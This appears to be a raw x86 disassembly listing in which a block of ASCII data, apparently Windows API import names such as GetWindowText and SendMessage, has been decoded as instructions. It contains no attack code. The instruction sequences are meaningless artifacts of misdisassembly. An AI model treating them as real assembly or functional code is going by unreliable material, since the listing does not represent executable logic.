  413c48:	outs   dx,DWORD PTR ds:[esi]
  413c49:	imul   ebp,DWORD PTR [esi+0x74],0x1680000
  413c50:	inc    edi
  413c51:	gs je  0x413cab
  413c54:	imul   ebp,DWORD PTR [esi+0x64],0x7d00776f
  413c5b:	add    dl,BYTE PTR [ebx+0x68]
  413c5e:	outs   dx,DWORD PTR ds:[esi]
  413c5f:	ja     0x413cb4
  413c61:	arpl   WORD PTR [edx+0x6f],si
  413c64:	ins    BYTE PTR es:[edi],dx
  413c65:	ins    BYTE PTR es:[edi],dx
  413c66:	inc    edx
  413c67:	popa   
  413c68:	jb     0x413c6a
  413c6a:	mov    cl,0x1
  413c6c:	dec    esp
  413c6d:	outs   dx,DWORD PTR ds:[esi]
  413c6e:	popa   
  413c6f:	fs dec ecx
  413c71:	ins    DWORD PTR es:[edi],dx
  413c72:	popa   
  413c73:	addr16 gs inc ecx
  413c76:	add    BYTE PTR [eax],al
  413c78:	cdq    
  413c79:	add    BYTE PTR [ecx+ebp*2+0x61],al
  413c7d:	ins    BYTE PTR es:[edi],dx
  413c7e:	outs   dx,DWORD PTR ds:[esi]
  413c7f:	addr16 inc edx
  413c81:	outs   dx,DWORD PTR ds:[esi]
  413c82:	js     0x413ccd
  413c84:	outs   dx,BYTE PTR ds:[esi]
  413c85:	imul   esi,DWORD PTR fs:[edx+0x65],0x61507463
  413c8d:	jb     0x413cf0
  413c8f:	ins    DWORD PTR es:[edi],dx
  413c90:	inc    ecx
  413c91:	add    ch,al
  413c93:	add    DWORD PTR [ebp+0x61],ecx
  413c96:	jo     0x413cee
  413c98:	imul   esi,DWORD PTR [edx+0x74],0x4b6c6175
  413c9f:	gs jns 0x413ce3
  413ca2:	add    BYTE PTR [eax],al
  413ca4:	sbb    BYTE PTR [edx],al
  413ca6:	push   edx
  413ca7:	gs ins DWORD PTR es:[edi],dx
  413ca9:	outs   dx,DWORD PTR ds:[esi]
  413caa:	jbe    0x413d11
  413cac:	push   eax
  413cad:	jb     0x413d1e
  413caf:	jo     0x413d08
  413cb1:	add    BYTE PTR [ecx+eax*1+0x47],ah
  413cb5:	gs je  0x413d0d
  413cb8:	jo     0x413d1e
  413cba:	popa   
  413cbb:	je     0x413d22
  413cbd:	push   edx
  413cbe:	outs   dx,BYTE PTR ds:[si]
  413cc0:	add    BYTE PTR [eax],al
  413cc2:	add    al,BYTE PTR [edx]
  413cc4:	push   edx
  413cc5:	imul   esi,DWORD PTR gs:[bp+di+0x74],0x6c437265
  413cce:	popa   
  413ccf:	jae    0x413d44
  413cd1:	inc    ecx
  413cd2:	add    BYTE PTR [eax],al
  413cd4:	add    dl,BYTE PTR ds:[ebx+0x65]
  413cd8:	je     0x413d1e
  413cda:	ins    BYTE PTR es:[edi],dx
  413cdb:	addr16 dec ecx
  413cdd:	je     0x413d44
  413cdf:	ins    DWORD PTR es:[edi],dx
  413ce0:	push   esp
  413ce1:	gs js  0x413d58
  413ce4:	inc    ecx
  413ce5:	add    BYTE PTR [ebp+0x61724400],dh
  413ceb:	ja     0x413d3a
  413ced:	outs   dx,BYTE PTR gs:[esi]
  413cef:	jne    0x413d33
  413cf1:	popa   
  413cf2:	jb     0x413cf4
  413cf4:	sub    eax,DWORD PTR [ecx]
  413cf6:	inc    edi
  413cf7:	gs je  0x413d47
  413cfa:	outs   dx,BYTE PTR gs:[esi]
  413cfc:	jne    0x413cfe
  413cfe:	repnz add DWORD PTR [eax+0x6f],edx
  413d02:	jae    0x413d78
  413d04:	dec    ebp
  413d05:	gs jae 0x413d7b
  413d08:	popa   
  413d09:	addr16 gs push edi
  413d0c:	add    BYTE PTR [eax],al
  413d0e:	push   cs
  413d0f:	add    DWORD PTR [edi+0x65],eax
  413d12:	je     0x413d58
  413d14:	ins    BYTE PTR es:[edi],dx
  413d15:	addr16 inc ebx
  413d17:	je     0x413d8b
  413d19:	ins    BYTE PTR es:[edi],dx
  413d1a:	dec    ecx
  413d1b:	inc    esp
  413d1c:	add    BYTE PTR [eax],al
  413d1e:	mov    cl,0x2
  413d20:	push   esi
  413d21:	imul   ecx,DWORD PTR [ebx+0x65],0x79
  413d25:	push   ebx
  413d26:	arpl   WORD PTR [ecx+0x6e],sp
  413d29:	push   edi
  413d2a:	add    BYTE PTR [eax],al
  413d2c:	sbb    BYTE PTR [ecx],al
  413d2e:	inc    edi
  413d2f:	gs je  0x413d7b
  413d32:	arpl   WORD PTR [edi+0x6e],bp
  413d35:	dec    ecx
  413d36:	outs   dx,BYTE PTR ds:[esi]
  413d37:	outs   dx,WORD PTR ds:[esi]
  413d39:	add    cl,cl
  413d3b:	add    DWORD PTR [ebp+0x61],ecx
  413d3e:	jo     0x413d97
  413d40:	imul   ebp,DWORD PTR [esi+0x64],0x6f50776f
  413d47:	imul   ebp,DWORD PTR [esi+0x74],0x2d0073
  413d4e:	inc    ebx
  413d4f:	push   0x654e7261
  413d54:	js     0x413dca
  413d56:	push   edi
  413d57:	add    BYTE PTR [ecx],ch
  413d59:	add    dl,BYTE PTR [ebx+0x65]
  413d5c:	outs   dx,BYTE PTR ds:[esi]
  413d5d:	fs dec ebp
  413d5f:	gs jae 0x413dd5
  413d62:	popa   
  413d63:	addr16 gs push esp
  413d66:	imul   ebp,DWORD PTR [ebp+0x65],0x4174756f
  413d6d:	add    BYTE PTR [eax],ch
  413d6f:	add    BYTE PTR [ebx+0x68],al
  413d72:	popa   
  413d73:	jb     0x413dc1
  413d75:	outs   dx,DWORD PTR ds:[esi]
  413d76:	ja     0x413ddd
  413d78:	jb     0x413dbc
  413d7a:	jne    0x413de2
  413d7c:	push   di
  413d7e:	add    BYTE PTR [eax],al
  413d80:	ins    DWORD PTR es:[edi],dx
  413d81:	add    DWORD PTR [edi+0x65],eax
  413d84:	je     0x413ddd
  413d86:	imul   ebp,DWORD PTR [esi+0x64],0x6f4c776f
  413d8d:	outs   dx,BYTE PTR ds:[esi]
  413d8e:	addr16 push edi
  413d90:	add    BYTE PTR [eax],al
  413d92:	mov    bh,0x2
  413d94:	push   edi
  413d95:	popa   
  413d96:	imul   esi,DWORD PTR [esi+eax*2+0x6f],0x706e4972
  413d9e:	jne    0x413e14
  413da0:	dec    ecx
  413da1:	fs ins BYTE PTR es:[edi],dx
  413da3:	add    BYTE PTR gs:[eax],al
  413da6:	mov    DWORD PTR [ecx],0x5670614d
  413dac:	imul   esi,DWORD PTR [edx+0x74],0x4b6c6175
  413db3:	gs jns 0x413dfb
  413db6:	js     0x413e0f
  413db8:	add    BYTE PTR [eax],al
  413dba:	cmp    eax,0x65684300
  413dbf:	arpl   WORD PTR [ebx+0x52],bp
  413dc2:	popa   
  413dc3:	imul   ebp,DWORD PTR fs:[edi+0x42],0x6f747475
  413dcb:	outs   dx,BYTE PTR ds:[esi]
  413dcc:	add    BYTE PTR [eax],al
  413dce:	add    eax,0x6c6c4100
  413dd3:	outs   dx,DWORD PTR ds:[esi]
  413dd4:	ja     0x413e29
  413dd6:	gs je  0x413e1f
  413dd9:	outs   dx,DWORD PTR ds:[esi]
  413dda:	jb     0x413e41
  413ddc:	addr16 jb 0x413e4e
  413ddf:	jne    0x413e4f
  413de1:	fs push edi
  413de3:	imul   ebp,DWORD PTR [esi+0x64],0x776f
  413dea:	into   
  413deb:	add    DWORD PTR [ebp+0x65],ecx
  413dee:	jae    0x413e63
  413df0:	popa   
  413df1:	addr16 gs inc edx
  413df4:	outs   dx,DWORD PTR ds:[esi]
  413df5:	js     0x413e38
  413df7:	add    BYTE PTR [edx],bh
  413df9:	add    DWORD PTR [edi+0x65],eax
  413dfc:	je     0x413e4b
  413dfe:	gs jae 0x413e74
  413e01:	popa   
  413e02:	addr16 gs inc ecx
  413e05:	add    BYTE PTR [edx+0x2],cl
  413e08:	push   ebx
  413e09:	gs je  0x413e59
  413e0c:	outs   dx,BYTE PTR gs:[esi]
  413e0e:	jne    0x413e54
  413e10:	gs popaw 
  413e13:	jne    0x413e81
  413e15:	je     0x413e60
  413e17:	je     0x413e7e
  413e19:	ins    DWORD PTR es:[edi],dx
  413e1a:	add    BYTE PTR [eax],al
  413e1c:	aad    0x1
  413e1e:	dec    ebp
  413e1f:	gs jae 0x413e95
  413e22:	popa   
  413e23:	addr16 gs inc edx
  413e26:	outs   dx,DWORD PTR ds:[esi]
  413e27:	js     0x413e80
  413e29:	add    BYTE PTR [ecx],bh
  413e2b:	add    DWORD PTR [edi+0x65],eax
  413e2e:	je     0x413e7d
  413e30:	outs   dx,BYTE PTR gs:[esi]
  413e32:	jne    0x413e87
  413e34:	je     0x413ea8
  413e36:	imul   ebp,DWORD PTR [esi+0x67],0xb9000057
  413e3d:	add    DWORD PTR [edi+ebp*2+0x61],ecx
  413e41:	fs dec ebp
  413e43:	outs   dx,BYTE PTR gs:[esi]
  413e45:	jne    0x413e9e
  413e47:	add    BYTE PTR [ecx+eax*1+0x47],bl
  413e4b:	gs je  0x413ea1
  413e4e:	jns    0x413ec3
  413e50:	je     0x413eb7
  413e52:	ins    DWORD PTR es:[edi],dx
  413e53:	dec    ebp
  413e54:	gs je  0x413ec9
  413e57:	imul   esp,DWORD PTR [ebx+0x73],0x2260000
  413e5e:	push   ebx
  413e5f:	outs   dx,BYTE PTR gs:[esi]
  413e61:	fs dec ebp
  413e63:	gs jae 0x413ed9
  413e66:	popa   
  413e67:	addr16 gs inc ecx
  413e6a:	add    BYTE PTR [eax],al
  413e6c:	aaa    
  413e6d:	add    DWORD PTR [edi+0x65],eax
  413e70:	je     0x413ebf
  413e72:	outs   dx,BYTE PTR gs:[esi]
  413e74:	jne    0x413ec9
  413e76:	je     0x413ed9
  413e78:	je     0x413edf
  413e7a:	add    BYTE PTR [eax],al
  413e7c:	mov    bl,0x0
  413e7e:	inc    esp
  413e7f:	jb     0x413ee2
  413e81:	ja     0x413ecc
  413e83:	arpl   WORD PTR [edi+0x6e],bp
  413e86:	add    BYTE PTR [eax],al
  413e88:	xchg   ebp,eax
  413e89:	add    BYTE PTR [ebp+eiz*2+0x73],al
  413e8d:	je     0x413f01
  413e8f:	outs   dx,DWORD PTR ds:[esi]
  413e90:	jns    0x413ed5
  413e92:	jne    0x413f06
  413e94:	jae    0x413f05
  413e96:	jb     0x413e98
  413e98:	add    al,BYTE PTR [eax]
  413e9a:	inc    ecx
  413e9b:	fs push 0x75
  413e9e:	jae    0x413f14
  413ea0:	push   edi
  413ea1:	imul   ebp,DWORD PTR [esi+0x64],0x6552776f
  413ea8:	arpl   WORD PTR [eax+eax*1+0x0],si
  413eac:	pop    ecx
  413ead:	add    DWORD PTR [edi+0x65],eax
  413eb0:	je     0x413f05
  413eb2:	jns    0x413f27
  413eb4:	inc    ebx
  413eb5:	outs   dx,DWORD PTR ds:[esi]
  413eb6:	ins    BYTE PTR es:[edi],dx
  413eb7:	outs   dx,DWORD PTR ds:[esi]
  413eb8:	jb     0x413eba
  413eba:	jle    0x413ebd
  413ebc:	dec    eax
  413ebd:	imul   ebp,DWORD PTR [ecx+ebp*2+0x74],0x6e654d65
  413ec5:	jne    0x413f10
  413ec7:	je     0x413f2e
  413ec9:	ins    DWORD PTR es:[edi],dx
  413eca:	add    BYTE PTR [eax],al
  413ecc:	or     DWORD PTR [eax],eax
  413ece:	inc    ecx
  413ecf:	jo     0x413f41
  413ed1:	outs   dx,BYTE PTR gs:[esi]
  413ed3:	fs dec ebp
  413ed5:	outs   dx,BYTE PTR gs:[esi]
  413ed7:	jne    0x413f30
  413ed9:	add    BYTE PTR [eax+eax*1],bh
  413edc:	inc    ebx
  413edd:	push   0x4d6b6365
  413ee2:	outs   dx,BYTE PTR gs:[esi]
  413ee4:	jne    0x413f38
  413ee6:	popa   
  413ee7:	imul   ebp,DWORD PTR fs:[edi+0x49],0x6d6574
  413eef:	add    BYTE PTR [ecx+eax*1+0x64616f4c],bh
  413ef6:	push   ebx
  413ef7:	je     0x413f6b
  413ef9:	imul   ebp,DWORD PTR [esi+0x67],0x21f0057
  413f00:	push   ebx
  413f01:	arpl   WORD PTR [edx+0x6f],si
  413f04:	ins    BYTE PTR es:[edi],dx
  413f05:	ins    BYTE PTR es:[edi],dx
  413f06:	push   edi
  413f07:	imul   ebp,DWORD PTR [esi+0x64],0x776f
  413f0e:	xor    DWORD PTR [eax],eax
  413f10:	inc    ebx
  413f11:	push   0x72507261
  413f16:	gs jbe 0x413f70
  413f19:	add    BYTE PTR [edi+0x2],bl
  413f1c:	push   ebx
  413f1d:	gs je  0x413f73
  413f20:	jns    0x413f95
  413f22:	inc    ebx
  413f23:	outs   dx,DWORD PTR ds:[esi]
  413f24:	ins    BYTE PTR es:[edi],dx
  413f25:	outs   dx,DWORD PTR ds:[esi]
  413f26:	jb     0x413f9b
  413f28:	add    BYTE PTR [eax],al
  413f2a:	sgdtd  [edi+0x65]
  413f2e:	je     0x413f74
  413f30:	ins    BYTE PTR es:[edi],dx
  413f31:	addr16 dec ecx
  413f33:	je     0x413f9a
  413f35:	ins    DWORD PTR es:[edi],dx
  413f36:	add    BYTE PTR [eax],al
  413f38:	dec    esp
  413f39:	add    dl,BYTE PTR [ebx+0x65]
  413f3c:	je     0x413f8b
  413f3e:	outs   dx,BYTE PTR gs:[esi]
  413f40:	jne    0x413f8b
  413f42:	je     0x413fa9
  413f44:	ins    DWORD PTR es:[edi],dx
  413f45:	inc    edx
  413f46:	imul   esi,DWORD PTR [ebp+ebp*2+0x61],0x7370
  413f4e:	or     al,0x1
  413f50:	inc    edi
  413f51:	gs je  0x413f98
  413f54:	gs jae 0x413fc2
  413f57:	je     0x413fc8
  413f59:	jo     0x413fb2
  413f5b:	imul   ebp,DWORD PTR [esi+0x64],0x776f
  413f62:	inc    ebp
  413f63:	add    DWORD PTR [edi+0x65],eax
  413f66:	je     0x413fb8
  413f68:	popa   
  413f69:	jb     0x413fd0
  413f6b:	outs   dx,BYTE PTR ds:[esi]
  413f6c:	je     0x413f6e
  413f6e:	mov    BYTE PTR [eax],0x45
  413f71:	outs   dx,BYTE PTR ds:[esi]
  413f72:	fs push esp
  413f74:	popa   
  413f75:	jae    0x413fe2
  413f77:	add    BYTE PTR [eax+0x0],ah
  413f7a:	inc    ebx
  413f7b:	jb     0x413fe2
  413f7d:	popa   
  413f7e:	je     0x413fe5
  413f80:	dec    ebp
  413f81:	outs   dx,BYTE PTR gs:[esi]
  413f83:	jne    0x413f85
  413f85:	add    bl,dh
  413f87:	add    BYTE PTR [edi+0x65],al
  413f8a:	je     0x413fcf
  413f8c:	popa   
  413f8d:	jb     0x413ff4
  413f8f:	je     0x413fe1
  413f91:	outs   dx,DWORD PTR ds:[esi]
  413f92:	jae    0x413f94
  413f94:	sub    eax,DWORD PTR [edx]
  413f96:	push   ebx
  413f97:	outs   dx,BYTE PTR gs:[esi]
  413f99:	fs dec ebp
  413f9b:	gs jae 0x414011
  413f9e:	popa   
  413f9f:	addr16 gs push edi
  413fa2:	add    BYTE PTR [eax],al
  413fa4:	test   DWORD PTR [ecx],eax
  413fa6:	dec    ecx
  413fa7:	outs   dx,BYTE PTR ds:[esi]
  413fa8:	jae    0x41400f
  413faa:	jb     0x414020
  413fac:	dec    ebp
  413fad:	outs   dx,BYTE PTR gs:[esi]
  413faf:	jne    0x413ffa
  413fb1:	je     0x414018
  413fb3:	ins    DWORD PTR es:[edi],dx
  413fb4:	push   edi
  413fb5:	add    BYTE PTR [ecx+0x0],ah
  413fb8:	inc    ebx
  413fb9:	jb     0x414020
  413fbb:	popa   
  413fbc:	je     0x414023
  413fbe:	push   eax
  413fbf:	outs   dx,DWORD PTR ds:[esi]
  413fc0:	jo     0x414037
  413fc2:	jo     0x414011
  413fc4:	outs   dx,BYTE PTR gs:[esi]
  413fc6:	jne    0x413fc8
  413fc8:	inc    eax
  413fc9:	add    DWORD PTR [edi+0x65],eax
  413fcc:	je     0x41401b
  413fce:	outs   dx,DWORD PTR ds:[esi]
  413fcf:	outs   dx,BYTE PTR ds:[esi]
  413fd0:	imul   esi,DWORD PTR [edi+ebp*2+0x72],0x6f666e49
  413fd8:	push   edi
  413fd9:	add    al,cl
  413fdb:	add    DWORD PTR [ebp+0x61],ecx
  413fde:	jo     0x414036
  413fe0:	imul   esi,DWORD PTR [edx+0x74],0x4b6c6175
  413fe7:	gs jns 0x414041
  413fea:	add    BYTE PTR [eax],al
  413fec:	out    0x0,eax
  413fee:	inc    esi
  413fef:	jb     0x414052
  413ff1:	ins    DWORD PTR es:[edi],dx
  413ff2:	gs push edx
  413ff4:	arpl   WORD PTR gs:[eax+eax*1-0x41],si
  413ff9:	add    BYTE PTR [ebp+0x6e],al
  413ffc:	popa   
  413ffd:	bound  ebp,QWORD PTR [ebp+eiz*2+0x4d]
  414001:	outs   dx,BYTE PTR gs:[esi]
  414003:	jne    0x41404e
  414005:	je     0x41406c
  414007:	ins    DWORD PTR es:[edi],dx
  414008:	add    BYTE PTR [eax],al
  41400a:	fwait
  41400b:	add    dl,BYTE PTR [ebp+0x6e]
  41400e:	ins    BYTE PTR es:[edi],dx
  41400f:	outs   dx,DWORD PTR ds:[esi]
  414010:	popa   
  414011:	fs dec ebx
  414013:	gs jns 0x414078
  414016:	outs   dx,DWORD PTR ds:[esi]
  414017:	popa   
  414018:	jb     0x41407e
  41401a:	dec    esp
  41401b:	popa   
  41401c:	jns    0x41408d
  41401e:	jne    0x414094
  414020:	add    BYTE PTR [eax],al
  414022:	mov    esp,0x6e695702
  414027:	outs   dx,DWORD PTR fs:[esi]
  414029:	ja     0x414071
  41402b:	jb     0x41409c
  41402d:	ins    DWORD PTR es:[edi],dx
  41402e:	push   eax
  41402f:	outs   dx,DWORD PTR ds:[esi]
  414030:	imul   ebp,DWORD PTR [esi+0x74],0x4400ab00
  414037:	jb     0x41409a
  414039:	ja     0x41407c
  41403b:	outs   dx,BYTE PTR ds:[esi]
  41403c:	imul   ebp,DWORD PTR [ebp+0x61],0x52646574
  414043:	arpl   WORD PTR gs:[ebx+esi*2+0x0],si
  414048:	and    BYTE PTR [edx],al
  41404a:	push   ebx
  41404b:	arpl   WORD PTR [edx+0x6f],si
  41404e:	ins    BYTE PTR es:[edi],dx
  41404f:	ins    BYTE PTR es:[edi],dx
  414050:	push   edi
  414051:	imul   ebp,DWORD PTR [esi+0x64],0x7845776f
  414058:	add    BYTE PTR [eax],al
  41405a:	pop    eax
  41405b:	add    dl,BYTE PTR [ebx+0x65]
  41405e:	je     0x4140b2
  414060:	arpl   WORD PTR gs:[eax+eax*1+0x3d],si
  414065:	add    dl,BYTE PTR [ebx+0x65]
  414068:	je     0x4140ae
  41406a:	ins    BYTE PTR es:[edi],dx
  41406b:	addr16 dec ecx
  41406d:	je     0x4140d4
  41406f:	ins    DWORD PTR es:[edi],dx
  414070:	dec    ecx
  414071:	outs   dx,BYTE PTR ds:[esi]
  414072:	je     0x414074
  414074:	or     eax,0x67654200
  414079:	imul   ebp,DWORD PTR [esi+0x50],0x746e6961
  414080:	add    BYTE PTR [eax],al
  414082:	pop    ebp
  414083:	add    BYTE PTR [ebx+0x72],al
  414086:	gs popa 
  414088:	je     0x4140ef
  41408a:	dec    ecx
  41408b:	arpl   WORD PTR [edi+0x6e],bp
  41408e:	dec    ecx
  41408f:	outs   dx,BYTE PTR ds:[esi]
  414090:	imul   esi,DWORD PTR fs:[edx+0x65],0x7463
  414098:	dec    esi
  414099:	add    dl,BYTE PTR [ebx+0x65]
  41409c:	je     0x4140eb
  41409e:	outs   dx,BYTE PTR gs:[esi]
  4140a0:	jne    0x4140eb
  4140a2:	je     0x414109
  4140a4:	ins    DWORD PTR es:[edi],dx
  4140a5:	dec    ecx
  4140a6:	outs   dx,BYTE PTR ds:[esi]
  4140a7:	outs   dx,WORD PTR ds:[esi]
  4140a9:	push   edi
  4140aa:	add    BYTE PTR [eax],al
  4140ac:	pop    edx
  4140ad:	add    dl,BYTE PTR [ebx+0x65]
  4140b0:	je     0x414105
  4140b2:	arpl   WORD PTR [edx+0x6f],si
  4140b5:	ins    BYTE PTR es:[edi],dx
  4140b6:	ins    BYTE PTR es:[edi],dx
  4140b7:	dec    ecx
  4140b8:	outs   dx,BYTE PTR ds:[esi]
  4140b9:	outs   dx,WORD PTR ds:[esi]
  4140bb:	add    BYTE PTR [edx],dh
  4140bd:	add    BYTE PTR [ebx+0x68],al
  4140c0:	popa   
  4140c1:	jb     0x414117
  4140c3:	outs   dx,DWORD PTR ds:[esi]
  4140c4:	dec    edi
  4140c5:	gs ins DWORD PTR es:[edi],dx
  4140c7:	inc    ecx
  4140c8:	add    BYTE PTR [eax],al
  4140ca:	sub    eax,0x6e655302
  4140cf:	fs dec esi
  4140d1:	outs   dx,DWORD PTR ds:[esi]
  4140d2:	je     0x41413d
  4140d4:	data16 jns 0x414124
  4140d7:	gs jae 0x41414d
  4140da:	popa   
  4140db:	addr16 gs push edi
  4140de:	add    BYTE PTR [eax],al
  4140e0:	sti    
  4140e1:	add    BYTE PTR [edi+0x65],al
  4140e4:	je     0x414129
  4140e6:	ins    BYTE PTR es:[edi],dx
  4140e7:	popa   
  4140e8:	jae    0x41415d
  4140ea:	dec    esi
  4140eb:	popa   
  4140ec:	ins    DWORD PTR es:[edi],dx
  4140ed:	gs push edi
  4140ef:	add    BYTE PTR [ebx+0x61725402],dl
  4140f5:	outs   dx,BYTE PTR ds:[esi]
  4140f6:	jae    0x414164
  4140f8:	popa   
  4140f9:	je     0x414160
  4140fb:	inc    ecx
  4140fc:	arpl   WORD PTR [ebx+0x65],sp
  4140ff:	ins    BYTE PTR es:[edi],dx
  414100:	gs jb  0x414164
  414103:	je     0x414174
  414105:	jb     0x414148
  414107:	add    BYTE PTR [ebx+0x2],bh
  41410a:	push   ebx
  41410b:	push   0x7543776f
  414110:	jb     0x414185
  414112:	outs   dx,DWORD PTR ds:[esi]
  414113:	jb     0x414115
  414115:	add    BYTE PTR [ebx+0x2],dh
  414118:	push   ebx
  414119:	gs je  0x414173
  41411c:	imul   ebp,DWORD PTR [esi+0x64],0x6554776f
  414123:	js     0x414199
  414125:	inc    ecx
  414126:	add    BYTE PTR [eax],al
  414128:	add    BYTE PTR es:[ebx+0x68],al
  41412c:	popa   
  41412d:	jb     0x41417b
  41412f:	outs   dx,DWORD PTR ds:[esi]
  414130:	ja     0x414197
  414132:	jb     0x414175
  414134:	add    BYTE PTR [eax],al
  414136:	xchg   BYTE PTR [ecx],al
  414138:	dec    ecx
  414139:	outs   dx,BYTE PTR ds:[esi]
  41413a:	jae    0x4141a1
  41413c:	jb     0x4141b2
  41413e:	dec    ebp
  41413f:	outs   dx,BYTE PTR gs:[esi]
  414141:	jne    0x41419a
  414143:	add    BYTE PTR [eax],cl
  414145:	add    BYTE PTR [ecx+0x70],al
  414148:	jo     0x4141af
  41414a:	outs   dx,BYTE PTR ds:[esi]
  41414b:	fs dec ebp
  41414d:	outs   dx,BYTE PTR gs:[esi]
  41414f:	jne    0x414192
  414151:	add    BYTE PTR [edx+0x1],ch
  414154:	inc    edi
  414155:	gs je  0x4141af
  414158:	imul   ebp,DWORD PTR [esi+0x64],0x4344776f
  41415f:	add    BYTE PTR [ecx+0x2],bl
  414162:	push   ebx
  414163:	gs je  0x4141b8
  414166:	arpl   WORD PTR gs:[ebp+eax*2+0x6d],si
  41416b:	jo     0x4141e1
  41416d:	jns    0x41416f
  41416f:	add    BYTE PTR [edx+0x1],bl
  414172:	inc    edi
  414173:	gs je  0x4141c9
  414176:	jns    0x4141eb
  414178:	inc    ebx
  414179:	outs   dx,DWORD PTR ds:[esi]
  41417a:	ins    BYTE PTR es:[edi],dx
  41417b:	outs   dx,DWORD PTR ds:[esi]
  41417c:	jb     0x4141c0
  41417e:	jb     0x4141f5
  414180:	jae    0x4141ea
  414182:	add    BYTE PTR [eax],al
  414184:	jg     0x414188
  414186:	push   ebx
  414187:	push   0x6957776f
  41418c:	outs   dx,BYTE PTR ds:[esi]
  41418d:	outs   dx,DWORD PTR fs:[esi]
  41418f:	ja     0x414191
  414191:	add    BYTE PTR [eax+eax*1],ah
  414194:	inc    ebx
  414195:	push   0x65676e61
  41419a:	dec    ebp
  41419b:	outs   dx,BYTE PTR gs:[esi]
  41419d:	jne    0x4141f6
  41419f:	add    al,ah
  4141a1:	add    DWORD PTR [edi+0x65],ecx
  4141a4:	ins    DWORD PTR es:[edi],dx
  4141a5:	push   esp
  4141a6:	outs   dx,DWORD PTR ds:[esi]
  4141a7:	inc    ebx
  4141a8:	push   0x417261
  4141ad:	add    BYTE PTR [edi+0x43734901],cl
  4141b3:	push   0x6c417261
  4141b8:	jo     0x414222
  4141ba:	popa   
  4141bb:	push   edi
  4141bc:	add    BYTE PTR [eax],al
  4141be:	xchg   BYTE PTR [edx],al
  4141c0:	push   ebx
  4141c1:	jns    0x414236
  4141c3:	je     0x41422a
  4141c5:	ins    DWORD PTR es:[edi],dx
  4141c6:	push   eax
  4141c7:	popa   
  4141c8:	jb     0x41422b
  4141ca:	ins    DWORD PTR es:[edi],dx
  4141cb:	gs je  0x414233
  4141ce:	jb     0x414243
  4141d0:	dec    ecx
  4141d1:	outs   dx,BYTE PTR ds:[esi]
  4141d2:	outs   dx,WORD PTR ds:[esi]
  4141d4:	push   edi
  4141d5:	add    BYTE PTR ds:0x67655202,al
  4141db:	imul   esi,DWORD PTR [ebx+0x74],0x6c437265
  4141e2:	popa   
  4141e3:	jae    0x414258
  4141e5:	push   edi
  4141e6:	add    BYTE PTR [eax],al
  4141e8:	add    BYTE PTR [edx],0x53
  4141eb:	push   0x6957776f
  4141f0:	outs   dx,BYTE PTR ds:[esi]
  4141f1:	outs   dx,DWORD PTR fs:[esi]
  4141f3:	ja     0x414236
  4141f5:	jae    0x414270
  4141f7:	outs   dx,BYTE PTR ds:[esi]
  4141f8:	arpl   WORD PTR [eax],ax
  4141fa:	mov    edi,0x70737702
  4141ff:	jb     0x41426a
  414201:	outs   dx,BYTE PTR ds:[esi]
  414202:	je     0x41426a
  414204:	inc    ecx
  414205:	add    BYTE PTR [esi+0x2],ch
  414208:	push   ebx
  414209:	gs je  0x414263
  41420c:	imul   ebp,DWORD PTR [esi+0x64],0x6f4c776f
  414213:	outs   dx,BYTE PTR ds:[esi]
  414214:	addr16 push edi
  414216:	add    BYTE PTR [eax],al
  414218:	test   BYTE PTR [edx],al
  41421a:	push   ebx
  41421b:	ja     0x414286
  41421d:	je     0x414282
  41421f:	push   0x68546f54
  414224:	imul   esi,DWORD PTR [ebx+0x57],0x6f646e69
  41422b:	ja     0x41422d
  41422d:	add    al,al
  41422f:	add    dh,BYTE PTR [edi+0x73]
  414232:	jo     0x4142a6
  414234:	imul   ebp,DWORD PTR [esi+0x74],0x97005766
  41423b:	add    DWORD PTR [ecx+0x73],ecx
  41423e:	inc    esp
  41423f:	imul   esp,DWORD PTR [ecx+0x6c],0x654d676f
  414246:	jae    0x4142bb
  414248:	popa   
  414249:	addr16 gs inc ecx
  41424c:	add    BYTE PTR [eax],al
  41424e:	daa    
  41424f:	add    DWORD PTR [edi+0x65],eax
  414252:	je     0x41429f
  414254:	gs jns 0x4142b9
  414257:	outs   dx,DWORD PTR ds:[esi]
  414258:	popa   
  414259:	jb     0x4142bf
  41425b:	push   esp
  41425c:	jns    0x4142ce
  41425e:	gs add bh,al
  414261:	add    BYTE PTR [ebp+0x6e],al
  414264:	jne    0x4142d3
  414266:	inc    ebx
  414267:	push   0x57646c69
  41426c:	imul   ebp,DWORD PTR [esi+0x64],0x73776f
  414273:	add    BYTE PTR [ebp+0x53],dl
  414276:	inc    ebp
  414277:	push   edx
  414278:	xor    esi,DWORD PTR [edx]
  41427a:	cs fs ins BYTE PTR es:[edi],dx
  41427d:	ins    BYTE PTR es:[edi],dx
  41427e:	add    BYTE PTR [eax],al
  414280:	lods   al,BYTE PTR ds:[esi]
  414281:	add    BYTE PTR [ebx+0x72],al
  414284:	gs popa 
  414286:	je     0x4142ed
  414288:	push   edx
  414289:	arpl   WORD PTR gs:[edx+edx*2+0x67],si
  41428e:	outs   dx,BYTE PTR ds:[esi]
  41428f:	dec    ecx
  414290:	outs   dx,BYTE PTR ds:[esi]
  414291:	imul   esi,DWORD PTR fs:[edx+0x65],0x89007463
  414299:	add    BYTE PTR [ebx+0x72],al
  41429c:	gs popa 
  41429e:	je     0x414305
  4142a0:	inc    edx
  4142a1:	jb     0x414318
  4142a3:	jae    0x41430d
  4142a5:	dec    ecx
  4142a6:	outs   dx,BYTE PTR ds:[esi]
  4142a7:	imul   esi,DWORD PTR fs:[edx+0x65],0xb7007463
  4142af:	add    DWORD PTR [eax+0x74],edx
  4142b2:	push   esi
  4142b3:	imul   esi,DWORD PTR [ebx+0x69],0x656c62
  4142ba:	iret   
  4142bb:	add    DWORD PTR [ebx+0x65],edx
  4142be:	ins    BYTE PTR es:[edi],dx
  4142bf:	arpl   WORD PTR gs:[eax+edx*2+0x61],si
  4142c4:	ins    BYTE PTR es:[edi],dx
  4142c5:	gs je  0x41433c
  4142c8:	add    BYTE PTR gs:[ebx+0x65724300],dl
  4142cf:	popa   
  4142d0:	je     0x414337
  4142d2:	inc    esp
  4142d3:	dec    ecx
  4142d4:	inc    edx
  4142d5:	imul   esi,DWORD PTR [ebp+ebp*2+0x61],0xc4000070
  4142dd:	add    DWORD PTR [edx+0x65],edx
  4142e0:	jae    0x41434b
  4142e2:	jp     0x414349
  4142e4:	push   eax
  4142e5:	popa   
  4142e6:	ins    BYTE PTR es:[edi],dx
  4142e7:	gs je  0x41435e
  4142ea:	add    BYTE PTR gs:[ebp+0x766f4d01],bl
  4142f1:	gs push esp
  4142f3:	outs   dx,DWORD PTR ds:[esi]
  4142f4:	inc    ebp
  4142f5:	js     0x4142f7
  4142f7:	add    BYTE PTR [edx+0x65724300],bl
  4142fd:	popa   
